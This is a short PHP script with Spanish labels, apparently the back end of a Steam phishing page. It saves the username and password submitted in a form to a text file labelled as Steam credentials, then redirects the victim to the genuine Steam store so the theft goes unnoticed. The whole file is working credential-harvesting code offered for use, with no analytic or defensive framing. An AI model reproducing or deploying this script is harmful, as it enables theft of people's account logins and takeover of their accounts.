<?php

file_put_contents("usuarios.txt", "  [~] Usuario de Steam: " . $_POST['username'] . "\n  [~] Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header("Location: https://store.steampowered.com/");
exit();
?>